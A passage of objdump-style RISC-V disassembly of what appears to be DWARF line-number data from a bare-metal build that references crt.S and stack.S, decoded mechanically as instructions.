     202:	0006                	c.slli	zero,0x1
     204:	0301                	addi	t1,t1,0
     206:	0901                	addi	s2,s2,0
     208:	0018                	0x18
     20a:	0301                	addi	t1,t1,0
     20c:	0901                	addi	s2,s2,0
     20e:	000e                	c.slli	zero,0x3
     210:	0301                	addi	t1,t1,0
     212:	0901                	addi	s2,s2,0
     214:	0014                	0x14
     216:	0301                	addi	t1,t1,0
     218:	0901                	addi	s2,s2,0
     21a:	0012                	c.slli	zero,0x4
     21c:	0301                	addi	t1,t1,0
     21e:	0902                	slli	s2,s2,0x0
     220:	0012                	c.slli	zero,0x4
     222:	0301                	addi	t1,t1,0
     224:	0901                	addi	s2,s2,0
     226:	001a                	c.slli	zero,0x6
     228:	0301                	addi	t1,t1,0
     22a:	0901                	addi	s2,s2,0
     22c:	0016                	c.slli	zero,0x5
     22e:	0001                	nop
     230:	0402                	slli	s0,s0,0x0
     232:	0302                	slli	t1,t1,0x0
     234:	00120977          	0x120977
     238:	0001                	nop
     23a:	0402                	slli	s0,s0,0x0
     23c:	0601                	addi	a2,a2,0
     23e:	0a090003          	lb	zero,160(s2)
     242:	0100                	addi	s0,sp,128
     244:	0306                	slli	t1,t1,0x1
     246:	090c                	addi	a1,sp,144
     248:	000c                	0xc
     24a:	0301                	addi	t1,t1,0
     24c:	0908                	addi	a0,sp,144
     24e:	0008                	0x8
     250:	0301                	addi	t1,t1,0
     252:	0901                	addi	s2,s2,0
     254:	000e                	c.slli	zero,0x3
     256:	0301                	addi	t1,t1,0
     258:	0901                	addi	s2,s2,0
     25a:	0006                	c.slli	zero,0x1
     25c:	0301                	addi	t1,t1,0
     25e:	0901                	addi	s2,s2,0
     260:	0004                	0x4
     262:	0301                	addi	t1,t1,0
     264:	0902                	slli	s2,s2,0x0
     266:	0008                	0x8
     268:	0301                	addi	t1,t1,0
     26a:	0901                	addi	s2,s2,0
     26c:	0018                	0x18
     26e:	0301                	addi	t1,t1,0
     270:	090a                	slli	s2,s2,0x2
     272:	0034                	addi	a3,sp,8
     274:	0301                	addi	t1,t1,0
     276:	0914                	addi	a3,sp,144
     278:	003c                	addi	a5,sp,8
     27a:	0301                	addi	t1,t1,0
     27c:	0901                	addi	s2,s2,0
     27e:	0010                	0x10
     280:	0301                	addi	t1,t1,0
     282:	0902                	slli	s2,s2,0x0
     284:	0008                	0x8
     286:	0301                	addi	t1,t1,0
     288:	0901                	addi	s2,s2,0
     28a:	0008                	0x8
     28c:	0301                	addi	t1,t1,0
     28e:	0902                	slli	s2,s2,0x0
     290:	0008                	0x8
     292:	0301                	addi	t1,t1,0
     294:	0904                	addi	s1,sp,144
     296:	0004                	0x4
     298:	0301                	addi	t1,t1,0
     29a:	00080903          	lb	s2,0(a6)
     29e:	0001                	nop
     2a0:	0402                	slli	s0,s0,0x0
     2a2:	09010303          	lb	t1,144(sp) # b0b0378 <_tbss_end+0xb0b02f4>
     2a6:	0006                	c.slli	zero,0x1
     2a8:	0001                	nop
     2aa:	0402                	slli	s0,s0,0x0
     2ac:	097f0303          	lb	t1,151(t5) # fffffffffffe2097 <_end+0xffffffff7ffc6e97>
     2b0:	0014                	0x14
     2b2:	0001                	nop
     2b4:	0402                	slli	s0,s0,0x0
     2b6:	0601                	addi	a2,a2,0
     2b8:	0a090003          	lb	zero,160(s2)
     2bc:	0100                	addi	s0,sp,128
     2be:	0306                	slli	t1,t1,0x1
     2c0:	0904                	addi	s1,sp,144
     2c2:	000c                	0xc
     2c4:	0301                	addi	t1,t1,0
     2c6:	002a0903          	lb	s2,2(s4)
     2ca:	0301                	addi	t1,t1,0
     2cc:	0901                	addi	s2,s2,0
     2ce:	000a                	c.slli	zero,0x2
     2d0:	0301                	addi	t1,t1,0
     2d2:	0905                	addi	s2,s2,1
     2d4:	0010                	0x10
     2d6:	0301                	addi	t1,t1,0
     2d8:	0901                	addi	s2,s2,0
     2da:	0006                	c.slli	zero,0x1
     2dc:	0301                	addi	t1,t1,0
     2de:	0901                	addi	s2,s2,0
     2e0:	0004                	0x4
     2e2:	0301                	addi	t1,t1,0
     2e4:	0901                	addi	s2,s2,0
     2e6:	0018                	0x18
     2e8:	0301                	addi	t1,t1,0
     2ea:	0901                	addi	s2,s2,0
     2ec:	0010                	0x10
     2ee:	0301                	addi	t1,t1,0
     2f0:	0901                	addi	s2,s2,0
     2f2:	0018                	0x18
     2f4:	0301                	addi	t1,t1,0
     2f6:	0901                	addi	s2,s2,0
     2f8:	0010                	0x10
     2fa:	0301                	addi	t1,t1,0
     2fc:	0901                	addi	s2,s2,0
     2fe:	001a                	c.slli	zero,0x6
     300:	0301                	addi	t1,t1,0
     302:	0901                	addi	s2,s2,0
     304:	0022                	c.slli	zero,0x8
     306:	0301                	addi	t1,t1,0
     308:	0902                	slli	s2,s2,0x0
     30a:	0004                	0x4
     30c:	0001                	nop
     30e:	0402                	slli	s0,s0,0x0
     310:	09010303          	lb	t1,144(sp)
     314:	0006                	c.slli	zero,0x1
     316:	0001                	nop
     318:	0402                	slli	s0,s0,0x0
     31a:	097f0303          	lb	t1,151(t5)
     31e:	0000                	unimp
     320:	0001                	nop
     322:	0402                	slli	s0,s0,0x0
     324:	0601                	addi	a2,a2,0
     326:	0a090003          	lb	zero,160(s2)
     32a:	0100                	addi	s0,sp,128
     32c:	0200                	addi	s0,sp,256
     32e:	0204                	addi	s1,sp,256
     330:	0306                	slli	t1,t1,0x1
     332:	0906                	slli	s2,s2,0x1
     334:	000c                	0xc
     336:	0001                	nop
     338:	0402                	slli	s0,s0,0x0
     33a:	0302                	slli	t1,t1,0x0
     33c:	096a                	slli	s2,s2,0x1a
     33e:	000c                	0xc
     340:	0001                	nop
     342:	0402                	slli	s0,s0,0x0
     344:	0601                	addi	a2,a2,0
     346:	0a090003          	lb	zero,160(s2)
     34a:	0100                	addi	s0,sp,128
     34c:	0200                	addi	s0,sp,256
     34e:	0204                	addi	s1,sp,256
     350:	0306                	slli	t1,t1,0x1
     352:	0008091b          	sext.w	s2,a6
     356:	0001                	nop
     358:	0402                	slli	s0,s0,0x0
     35a:	0302                	slli	t1,t1,0x0
     35c:	0901                	addi	s2,s2,0
     35e:	0004                	0x4
     360:	0001                	nop
     362:	0402                	slli	s0,s0,0x0
     364:	0302                	slli	t1,t1,0x0
     366:	0901                	addi	s2,s2,0
     368:	0010                	0x10
     36a:	0001                	nop
     36c:	0402                	slli	s0,s0,0x0
     36e:	0302                	slli	t1,t1,0x0
     370:	0901                	addi	s2,s2,0
     372:	001a                	c.slli	zero,0x6
     374:	0001                	nop
     376:	0402                	slli	s0,s0,0x0
     378:	0302                	slli	t1,t1,0x0
     37a:	0901                	addi	s2,s2,0
     37c:	0018                	0x18
     37e:	0001                	nop
     380:	0402                	slli	s0,s0,0x0
     382:	0302                	slli	t1,t1,0x0
     384:	001c0957          	0x1c0957
     388:	0001                	nop
     38a:	0402                	slli	s0,s0,0x0
     38c:	0601                	addi	a2,a2,0
     38e:	0a090003          	lb	zero,160(s2)
     392:	0100                	addi	s0,sp,128
     394:	0306                	slli	t1,t1,0x1
     396:	092c                	addi	a1,sp,152
     398:	000a                	c.slli	zero,0x2
     39a:	0301                	addi	t1,t1,0
     39c:	0901                	addi	s2,s2,0
     39e:	0002                	c.slli	zero,0x0
     3a0:	0901                	addi	s2,s2,0
     3a2:	000a                	c.slli	zero,0x2
     3a4:	0100                	addi	s0,sp,128
     3a6:	f401                	bnez	s0,2ae <_tbss_end+0x22a>
     3a8:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     3ac:	2000                	fld	fs0,0(s0)
     3ae:	0000                	unimp
     3b0:	0100                	addi	s0,sp,128
     3b2:	fb01                	bnez	a4,2c2 <_tbss_end+0x23e>
     3b4:	0d0e                	slli	s10,s10,0x3
     3b6:	0100                	addi	s0,sp,128
     3b8:	0101                	addi	sp,sp,0
     3ba:	0001                	nop
     3bc:	0000                	unimp
     3be:	0001                	nop
     3c0:	0100                	addi	s0,sp,128
     3c2:	00637273          	csrrci	tp,0x6,6
     3c6:	6300                	ld	s0,0(a4)
     3c8:	7472                	ld	s0,312(sp)
     3ca:	532e                	lw	t1,232(sp)
     3cc:	0100                	addi	s0,sp,128
     3ce:	0000                	unimp
     3d0:	0000                	unimp
     3d2:	0209                	addi	tp,tp,2
     3d4:	0000                	unimp
     3d6:	8000                	0x8000
     3d8:	0000                	unimp
     3da:	0000                	unimp
     3dc:	03011103          	lh	sp,48(sp)
     3e0:	0901                	addi	s2,s2,0
     3e2:	0002                	c.slli	zero,0x0
     3e4:	0301                	addi	t1,t1,0
     3e6:	0901                	addi	s2,s2,0
     3e8:	0002                	c.slli	zero,0x0
     3ea:	0301                	addi	t1,t1,0
     3ec:	0901                	addi	s2,s2,0
     3ee:	0002                	c.slli	zero,0x0
     3f0:	0301                	addi	t1,t1,0
     3f2:	0901                	addi	s2,s2,0
     3f4:	0002                	c.slli	zero,0x0
     3f6:	0301                	addi	t1,t1,0
     3f8:	0901                	addi	s2,s2,0
     3fa:	0002                	c.slli	zero,0x0
     3fc:	0301                	addi	t1,t1,0
     3fe:	0901                	addi	s2,s2,0
     400:	0002                	c.slli	zero,0x0
     402:	0301                	addi	t1,t1,0
     404:	0901                	addi	s2,s2,0
     406:	0002                	c.slli	zero,0x0
     408:	0301                	addi	t1,t1,0
     40a:	0901                	addi	s2,s2,0
     40c:	0002                	c.slli	zero,0x0
     40e:	0301                	addi	t1,t1,0
     410:	0901                	addi	s2,s2,0
     412:	0002                	c.slli	zero,0x0
     414:	0301                	addi	t1,t1,0
     416:	0901                	addi	s2,s2,0
     418:	0002                	c.slli	zero,0x0
     41a:	0301                	addi	t1,t1,0
     41c:	0901                	addi	s2,s2,0
     41e:	0002                	c.slli	zero,0x0
     420:	0301                	addi	t1,t1,0
     422:	0901                	addi	s2,s2,0
     424:	0002                	c.slli	zero,0x0
     426:	0301                	addi	t1,t1,0
     428:	0901                	addi	s2,s2,0
     42a:	0002                	c.slli	zero,0x0
     42c:	0301                	addi	t1,t1,0
     42e:	0901                	addi	s2,s2,0
     430:	0002                	c.slli	zero,0x0
     432:	0301                	addi	t1,t1,0
     434:	0901                	addi	s2,s2,0
     436:	0002                	c.slli	zero,0x0
     438:	0301                	addi	t1,t1,0
     43a:	0901                	addi	s2,s2,0
     43c:	0002                	c.slli	zero,0x0
     43e:	0301                	addi	t1,t1,0
     440:	0901                	addi	s2,s2,0
     442:	0002                	c.slli	zero,0x0
     444:	0301                	addi	t1,t1,0
     446:	0901                	addi	s2,s2,0
     448:	0002                	c.slli	zero,0x0
     44a:	0301                	addi	t1,t1,0
     44c:	0901                	addi	s2,s2,0
     44e:	0002                	c.slli	zero,0x0
     450:	0301                	addi	t1,t1,0
     452:	0901                	addi	s2,s2,0
     454:	0002                	c.slli	zero,0x0
     456:	0301                	addi	t1,t1,0
     458:	0901                	addi	s2,s2,0
     45a:	0002                	c.slli	zero,0x0
     45c:	0301                	addi	t1,t1,0
     45e:	0901                	addi	s2,s2,0
     460:	0002                	c.slli	zero,0x0
     462:	0301                	addi	t1,t1,0
     464:	0901                	addi	s2,s2,0
     466:	0002                	c.slli	zero,0x0
     468:	0301                	addi	t1,t1,0
     46a:	0901                	addi	s2,s2,0
     46c:	0002                	c.slli	zero,0x0
     46e:	0301                	addi	t1,t1,0
     470:	0901                	addi	s2,s2,0
     472:	0002                	c.slli	zero,0x0
     474:	0301                	addi	t1,t1,0
     476:	0901                	addi	s2,s2,0
     478:	0002                	c.slli	zero,0x0
     47a:	0301                	addi	t1,t1,0
     47c:	0901                	addi	s2,s2,0
     47e:	0002                	c.slli	zero,0x0
     480:	0301                	addi	t1,t1,0
     482:	0901                	addi	s2,s2,0
     484:	0002                	c.slli	zero,0x0
     486:	0301                	addi	t1,t1,0
     488:	0901                	addi	s2,s2,0
     48a:	0002                	c.slli	zero,0x0
     48c:	0301                	addi	t1,t1,0
     48e:	0901                	addi	s2,s2,0
     490:	0002                	c.slli	zero,0x0
     492:	0301                	addi	t1,t1,0
     494:	00020903          	lb	s2,0(tp) # 1a000 <_tbss_end+0x19f7c>
     498:	0301                	addi	t1,t1,0
     49a:	0901                	addi	s2,s2,0
     49c:	0002                	c.slli	zero,0x0
     49e:	0301                	addi	t1,t1,0
     4a0:	00040903          	lb	s2,0(s0) # ffffffffffffa000 <_end+0xffffffff7ffdee00>
     4a4:	0301                	addi	t1,t1,0
     4a6:	0902                	slli	s2,s2,0x0
     4a8:	0002                	c.slli	zero,0x0
     4aa:	0301                	addi	t1,t1,0
     4ac:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     4b0:	0301                	addi	t1,t1,0
     4b2:	0906                	slli	s2,s2,0x1
     4b4:	0004                	0x4
     4b6:	0301                	addi	t1,t1,0
     4b8:	0901                	addi	s2,s2,0
     4ba:	0002                	c.slli	zero,0x0
     4bc:	0301                	addi	t1,t1,0
     4be:	0901                	addi	s2,s2,0
     4c0:	0008                	0x8
     4c2:	0301                	addi	t1,t1,0
     4c4:	0904                	addi	s1,sp,144
     4c6:	0002                	c.slli	zero,0x0
     4c8:	0301                	addi	t1,t1,0
     4ca:	00080903          	lb	s2,0(a6)
     4ce:	0301                	addi	t1,t1,0
     4d0:	00040903          	lb	s2,0(s0)
     4d4:	0301                	addi	t1,t1,0
     4d6:	0902                	slli	s2,s2,0x0
     4d8:	0004                	0x4
     4da:	0301                	addi	t1,t1,0
     4dc:	0901                	addi	s2,s2,0
     4de:	0004                	0x4
     4e0:	0301                	addi	t1,t1,0
     4e2:	0901                	addi	s2,s2,0
     4e4:	0004                	0x4
     4e6:	0301                	addi	t1,t1,0
     4e8:	0901                	addi	s2,s2,0
     4ea:	0004                	0x4
     4ec:	0301                	addi	t1,t1,0
     4ee:	0901                	addi	s2,s2,0
     4f0:	0004                	0x4
     4f2:	0301                	addi	t1,t1,0
     4f4:	0901                	addi	s2,s2,0
     4f6:	0004                	0x4
     4f8:	0301                	addi	t1,t1,0
     4fa:	0901                	addi	s2,s2,0
     4fc:	0004                	0x4
     4fe:	0301                	addi	t1,t1,0
     500:	0901                	addi	s2,s2,0
     502:	0004                	0x4
     504:	0301                	addi	t1,t1,0
     506:	0901                	addi	s2,s2,0
     508:	0004                	0x4
     50a:	0301                	addi	t1,t1,0
     50c:	0901                	addi	s2,s2,0
     50e:	0004                	0x4
     510:	0301                	addi	t1,t1,0
     512:	0901                	addi	s2,s2,0
     514:	0004                	0x4
     516:	0301                	addi	t1,t1,0
     518:	0901                	addi	s2,s2,0
     51a:	0004                	0x4
     51c:	0301                	addi	t1,t1,0
     51e:	0901                	addi	s2,s2,0
     520:	0004                	0x4
     522:	0301                	addi	t1,t1,0
     524:	0901                	addi	s2,s2,0
     526:	0004                	0x4
     528:	0301                	addi	t1,t1,0
     52a:	0901                	addi	s2,s2,0
     52c:	0004                	0x4
     52e:	0301                	addi	t1,t1,0
     530:	0901                	addi	s2,s2,0
     532:	0004                	0x4
     534:	0301                	addi	t1,t1,0
     536:	0901                	addi	s2,s2,0
     538:	0004                	0x4
     53a:	0301                	addi	t1,t1,0
     53c:	0901                	addi	s2,s2,0
     53e:	0004                	0x4
     540:	0301                	addi	t1,t1,0
     542:	0901                	addi	s2,s2,0
     544:	0004                	0x4
     546:	0301                	addi	t1,t1,0
     548:	0901                	addi	s2,s2,0
     54a:	0004                	0x4
     54c:	0301                	addi	t1,t1,0
     54e:	0901                	addi	s2,s2,0
     550:	0004                	0x4
     552:	0301                	addi	t1,t1,0
     554:	0901                	addi	s2,s2,0
     556:	0004                	0x4
     558:	0301                	addi	t1,t1,0
     55a:	0901                	addi	s2,s2,0
     55c:	0004                	0x4
     55e:	0301                	addi	t1,t1,0
     560:	0901                	addi	s2,s2,0
     562:	0004                	0x4
     564:	0301                	addi	t1,t1,0
     566:	0901                	addi	s2,s2,0
     568:	0004                	0x4
     56a:	0301                	addi	t1,t1,0
     56c:	0901                	addi	s2,s2,0
     56e:	0004                	0x4
     570:	0301                	addi	t1,t1,0
     572:	0901                	addi	s2,s2,0
     574:	0004                	0x4
     576:	0301                	addi	t1,t1,0
     578:	0901                	addi	s2,s2,0
     57a:	0004                	0x4
     57c:	0301                	addi	t1,t1,0
     57e:	0901                	addi	s2,s2,0
     580:	0004                	0x4
     582:	0301                	addi	t1,t1,0
     584:	0901                	addi	s2,s2,0
     586:	0004                	0x4
     588:	0301                	addi	t1,t1,0
     58a:	0901                	addi	s2,s2,0
     58c:	0004                	0x4
     58e:	0301                	addi	t1,t1,0
     590:	0901                	addi	s2,s2,0
     592:	0004                	0x4
     594:	0301                	addi	t1,t1,0
     596:	0905                	addi	s2,s2,1
     598:	0004                	0x4
     59a:	0301                	addi	t1,t1,0
     59c:	0901                	addi	s2,s2,0
     59e:	0008                	0x8
     5a0:	0301                	addi	t1,t1,0
     5a2:	0905                	addi	s2,s2,1
     5a4:	0004                	0x4
     5a6:	0301                	addi	t1,t1,0
     5a8:	0904                	addi	s1,sp,144
     5aa:	0008                	0x8
     5ac:	0301                	addi	t1,t1,0
     5ae:	0901                	addi	s2,s2,0
     5b0:	0008                	0x8
     5b2:	0301                	addi	t1,t1,0
     5b4:	00040903          	lb	s2,0(s0)
     5b8:	0301                	addi	t1,t1,0
     5ba:	0902                	slli	s2,s2,0x0
     5bc:	0004                	0x4
     5be:	0301                	addi	t1,t1,0
     5c0:	0902                	slli	s2,s2,0x0
     5c2:	0002                	c.slli	zero,0x0
     5c4:	0301                	addi	t1,t1,0
     5c6:	0904                	addi	s1,sp,144
     5c8:	0004                	0x4
     5ca:	0301                	addi	t1,t1,0
     5cc:	0901                	addi	s2,s2,0
     5ce:	0004                	0x4
     5d0:	0301                	addi	t1,t1,0
     5d2:	0901                	addi	s2,s2,0
     5d4:	0002                	c.slli	zero,0x0
     5d6:	0301                	addi	t1,t1,0
     5d8:	0901                	addi	s2,s2,0
     5da:	0004                	0x4
     5dc:	0301                	addi	t1,t1,0
     5de:	0901                	addi	s2,s2,0
     5e0:	0002                	c.slli	zero,0x0
     5e2:	0301                	addi	t1,t1,0
     5e4:	0902                	slli	s2,s2,0x0
     5e6:	0002                	c.slli	zero,0x0
     5e8:	0301                	addi	t1,t1,0
     5ea:	0904                	addi	s1,sp,144
     5ec:	0004                	0x4
     5ee:	0301                	addi	t1,t1,0
     5f0:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     5f4:	0301                	addi	t1,t1,0
     5f6:	0901                	addi	s2,s2,0
     5f8:	0002                	c.slli	zero,0x0
     5fa:	0301                	addi	t1,t1,0
     5fc:	0901                	addi	s2,s2,0
     5fe:	0002                	c.slli	zero,0x0
     600:	0301                	addi	t1,t1,0
     602:	0901                	addi	s2,s2,0
     604:	0002                	c.slli	zero,0x0
     606:	0301                	addi	t1,t1,0
     608:	0901                	addi	s2,s2,0
     60a:	0002                	c.slli	zero,0x0
     60c:	0301                	addi	t1,t1,0
     60e:	0901                	addi	s2,s2,0
     610:	0002                	c.slli	zero,0x0
     612:	0301                	addi	t1,t1,0
     614:	0901                	addi	s2,s2,0
     616:	0002                	c.slli	zero,0x0
     618:	0301                	addi	t1,t1,0
     61a:	0901                	addi	s2,s2,0
     61c:	0002                	c.slli	zero,0x0
     61e:	0301                	addi	t1,t1,0
     620:	0901                	addi	s2,s2,0
     622:	0002                	c.slli	zero,0x0
     624:	0301                	addi	t1,t1,0
     626:	0901                	addi	s2,s2,0
     628:	0002                	c.slli	zero,0x0
     62a:	0301                	addi	t1,t1,0
     62c:	0901                	addi	s2,s2,0
     62e:	0002                	c.slli	zero,0x0
     630:	0301                	addi	t1,t1,0
     632:	0901                	addi	s2,s2,0
     634:	0002                	c.slli	zero,0x0
     636:	0301                	addi	t1,t1,0
     638:	0901                	addi	s2,s2,0
     63a:	0002                	c.slli	zero,0x0
     63c:	0301                	addi	t1,t1,0
     63e:	0901                	addi	s2,s2,0
     640:	0002                	c.slli	zero,0x0
     642:	0301                	addi	t1,t1,0
     644:	0901                	addi	s2,s2,0
     646:	0002                	c.slli	zero,0x0
     648:	0301                	addi	t1,t1,0
     64a:	0901                	addi	s2,s2,0
     64c:	0002                	c.slli	zero,0x0
     64e:	0301                	addi	t1,t1,0
     650:	0901                	addi	s2,s2,0
     652:	0002                	c.slli	zero,0x0
     654:	0301                	addi	t1,t1,0
     656:	0901                	addi	s2,s2,0
     658:	0002                	c.slli	zero,0x0
     65a:	0301                	addi	t1,t1,0
     65c:	0901                	addi	s2,s2,0
     65e:	0002                	c.slli	zero,0x0
     660:	0301                	addi	t1,t1,0
     662:	0901                	addi	s2,s2,0
     664:	0002                	c.slli	zero,0x0
     666:	0301                	addi	t1,t1,0
     668:	0901                	addi	s2,s2,0
     66a:	0002                	c.slli	zero,0x0
     66c:	0301                	addi	t1,t1,0
     66e:	0901                	addi	s2,s2,0
     670:	0002                	c.slli	zero,0x0
     672:	0301                	addi	t1,t1,0
     674:	0901                	addi	s2,s2,0
     676:	0002                	c.slli	zero,0x0
     678:	0301                	addi	t1,t1,0
     67a:	0901                	addi	s2,s2,0
     67c:	0002                	c.slli	zero,0x0
     67e:	0301                	addi	t1,t1,0
     680:	0901                	addi	s2,s2,0
     682:	0002                	c.slli	zero,0x0
     684:	0301                	addi	t1,t1,0
     686:	0901                	addi	s2,s2,0
     688:	0002                	c.slli	zero,0x0
     68a:	0301                	addi	t1,t1,0
     68c:	0901                	addi	s2,s2,0
     68e:	0002                	c.slli	zero,0x0
     690:	0301                	addi	t1,t1,0
     692:	0901                	addi	s2,s2,0
     694:	0002                	c.slli	zero,0x0
     696:	0301                	addi	t1,t1,0
     698:	0901                	addi	s2,s2,0
     69a:	0002                	c.slli	zero,0x0
     69c:	0301                	addi	t1,t1,0
     69e:	0901                	addi	s2,s2,0
     6a0:	0002                	c.slli	zero,0x0
     6a2:	0301                	addi	t1,t1,0
     6a4:	0901                	addi	s2,s2,0
     6a6:	0002                	c.slli	zero,0x0
     6a8:	0301                	addi	t1,t1,0
     6aa:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     6ae:	0301                	addi	t1,t1,0
     6b0:	00040903          	lb	s2,0(s0)
     6b4:	0301                	addi	t1,t1,0
     6b6:	00040903          	lb	s2,0(s0)
     6ba:	0301                	addi	t1,t1,0
     6bc:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     6c0:	0301                	addi	t1,t1,0
     6c2:	00040903          	lb	s2,0(s0)
     6c6:	0301                	addi	t1,t1,0
     6c8:	00040903          	lb	s2,0(s0)
     6cc:	0301                	addi	t1,t1,0
     6ce:	0901                	addi	s2,s2,0
     6d0:	0008                	0x8
     6d2:	0301                	addi	t1,t1,0
     6d4:	0902                	slli	s2,s2,0x0
     6d6:	0004                	0x4
     6d8:	0301                	addi	t1,t1,0
     6da:	0901                	addi	s2,s2,0
     6dc:	0002                	c.slli	zero,0x0
     6de:	0301                	addi	t1,t1,0
     6e0:	0901                	addi	s2,s2,0
     6e2:	0002                	c.slli	zero,0x0
     6e4:	0301                	addi	t1,t1,0
     6e6:	0901                	addi	s2,s2,0
     6e8:	0002                	c.slli	zero,0x0
     6ea:	0301                	addi	t1,t1,0
     6ec:	0901                	addi	s2,s2,0
     6ee:	0002                	c.slli	zero,0x0
     6f0:	0301                	addi	t1,t1,0
     6f2:	0901                	addi	s2,s2,0
     6f4:	0002                	c.slli	zero,0x0
     6f6:	0301                	addi	t1,t1,0
     6f8:	0901                	addi	s2,s2,0
     6fa:	0002                	c.slli	zero,0x0
     6fc:	0301                	addi	t1,t1,0
     6fe:	0901                	addi	s2,s2,0
     700:	0002                	c.slli	zero,0x0
     702:	0301                	addi	t1,t1,0
     704:	0901                	addi	s2,s2,0
     706:	0002                	c.slli	zero,0x0
     708:	0301                	addi	t1,t1,0
     70a:	0901                	addi	s2,s2,0
     70c:	0002                	c.slli	zero,0x0
     70e:	0301                	addi	t1,t1,0
     710:	0901                	addi	s2,s2,0
     712:	0002                	c.slli	zero,0x0
     714:	0301                	addi	t1,t1,0
     716:	0901                	addi	s2,s2,0
     718:	0002                	c.slli	zero,0x0
     71a:	0301                	addi	t1,t1,0
     71c:	0901                	addi	s2,s2,0
     71e:	0002                	c.slli	zero,0x0
     720:	0301                	addi	t1,t1,0
     722:	0901                	addi	s2,s2,0
     724:	0002                	c.slli	zero,0x0
     726:	0301                	addi	t1,t1,0
     728:	0901                	addi	s2,s2,0
     72a:	0002                	c.slli	zero,0x0
     72c:	0301                	addi	t1,t1,0
     72e:	0901                	addi	s2,s2,0
     730:	0002                	c.slli	zero,0x0
     732:	0301                	addi	t1,t1,0
     734:	0901                	addi	s2,s2,0
     736:	0002                	c.slli	zero,0x0
     738:	0301                	addi	t1,t1,0
     73a:	0901                	addi	s2,s2,0
     73c:	0002                	c.slli	zero,0x0
     73e:	0301                	addi	t1,t1,0
     740:	0901                	addi	s2,s2,0
     742:	0002                	c.slli	zero,0x0
     744:	0301                	addi	t1,t1,0
     746:	0901                	addi	s2,s2,0
     748:	0002                	c.slli	zero,0x0
     74a:	0301                	addi	t1,t1,0
     74c:	0901                	addi	s2,s2,0
     74e:	0002                	c.slli	zero,0x0
     750:	0301                	addi	t1,t1,0
     752:	0901                	addi	s2,s2,0
     754:	0002                	c.slli	zero,0x0
     756:	0301                	addi	t1,t1,0
     758:	0901                	addi	s2,s2,0
     75a:	0002                	c.slli	zero,0x0
     75c:	0301                	addi	t1,t1,0
     75e:	0901                	addi	s2,s2,0
     760:	0002                	c.slli	zero,0x0
     762:	0301                	addi	t1,t1,0
     764:	0901                	addi	s2,s2,0
     766:	0002                	c.slli	zero,0x0
     768:	0301                	addi	t1,t1,0
     76a:	0901                	addi	s2,s2,0
     76c:	0002                	c.slli	zero,0x0
     76e:	0301                	addi	t1,t1,0
     770:	0901                	addi	s2,s2,0
     772:	0002                	c.slli	zero,0x0
     774:	0301                	addi	t1,t1,0
     776:	0901                	addi	s2,s2,0
     778:	0002                	c.slli	zero,0x0
     77a:	0301                	addi	t1,t1,0
     77c:	0901                	addi	s2,s2,0
     77e:	0002                	c.slli	zero,0x0
     780:	0301                	addi	t1,t1,0
     782:	0901                	addi	s2,s2,0
     784:	0002                	c.slli	zero,0x0
     786:	0301                	addi	t1,t1,0
     788:	0901                	addi	s2,s2,0
     78a:	0002                	c.slli	zero,0x0
     78c:	0301                	addi	t1,t1,0
     78e:	0902                	slli	s2,s2,0x0
     790:	0002                	c.slli	zero,0x0
     792:	0301                	addi	t1,t1,0
     794:	0901                	addi	s2,s2,0
     796:	0002                	c.slli	zero,0x0
     798:	0901                	addi	s2,s2,0
     79a:	0004                	0x4
     79c:	0100                	addi	s0,sp,128
     79e:	8801                	andi	s0,s0,0
     7a0:	0000                	unimp
     7a2:	0200                	addi	s0,sp,256
     7a4:	2200                	fld	fs0,0(a2)
     7a6:	0000                	unimp
     7a8:	0100                	addi	s0,sp,128
     7aa:	fb01                	bnez	a4,6ba <_tbss_end+0x636>
     7ac:	0d0e                	slli	s10,s10,0x3
     7ae:	0100                	addi	s0,sp,128
     7b0:	0101                	addi	sp,sp,0
     7b2:	0001                	nop
     7b4:	0000                	unimp
     7b6:	0001                	nop
     7b8:	0100                	addi	s0,sp,128
     7ba:	00637273          	csrrci	tp,0x6,6
     7be:	7300                	ld	s0,32(a4)
     7c0:	6174                	ld	a3,192(a0)
     7c2:	532e6b63          	bltu	t3,s2,cf8 <_tbss_end+0xc74>
     7c6:	0100                	addi	s0,sp,128
     7c8:	0000                	unimp
     7ca:	0000                	unimp
     7cc:	0209                	addi	tp,tp,2
     7ce:	14a8                	addi	a0,sp,616
     7d0:	8000                	0x8000
     7d2:	0000                	unimp
     7d4:	0000                	unimp
     7d6:	09010317          	auipc	t1,0x9010
     7da:	0002                	c.slli	zero,0x0
     7dc:	0301                	addi	t1,t1,0
     7de:	0904                	addi	s1,sp,144
     7e0:	0002                	c.slli	zero,0x0
     7e2:	0301                	addi	t1,t1,0
     7e4:	0901                	addi	s2,s2,0
     7e6:	0002                	c.slli	zero,0x0
     7e8:	0301                	addi	t1,t1,0
     7ea:	0901                	addi	s2,s2,0
     7ec:	0004                	0x4
     7ee:	0301                	addi	t1,t1,0
     7f0:	0901                	addi	s2,s2,0
     7f2:	0004                	0x4
     7f4:	0301                	addi	t1,t1,0
     7f6:	0901                	addi	s2,s2,0
     7f8:	0004                	0x4
     7fa:	0301                	addi	t1,t1,0
     7fc:	0901                	addi	s2,s2,0
     7fe:	0004                	0x4
     800:	0301                	addi	t1,t1,0
     802:	0901                	addi	s2,s2,0
     804:	0004                	0x4
     806:	0301                	addi	t1,t1,0
     808:	0901                	addi	s2,s2,0
     80a:	0004                	0x4
     80c:	0301                	addi	t1,t1,0
     80e:	0901                	addi	s2,s2,0
     810:	0004                	0x4
     812:	0301                	addi	t1,t1,0
     814:	0901                	addi	s2,s2,0
     816:	0004                	0x4
     818:	0301                	addi	t1,t1,0
     81a:	0901                	addi	s2,s2,0
     81c:	0004                	0x4
     81e:	0301                	addi	t1,t1,0
     820:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     824:	0901                	addi	s2,s2,0
     826:	0002                	c.slli	zero,0x0
     828:	0100                	addi	s0,sp,128
     82a:	8f01                	sub	a4,a4,s0
     82c:	000a                	c.slli	zero,0x2
     82e:	0200                	addi	s0,sp,256
     830:	6200                	ld	s0,0(a2)
     832:	0001                	nop
     834:	0100                	addi	s0,sp,128
     836:	fb01                	bnez	a4,746 <_tbss_end+0x6c2>
     838:	0d0e                	slli	s10,s10,0x3
     83a:	0100                	addi	s0,sp,128
     83c:	0101                	addi	sp,sp,0
     83e:	0001                	nop
     840:	0000                	unimp
     842:	0001                	nop
     844:	0100                	addi	s0,sp,128
     846:	6e69                	lui	t3,0x1a
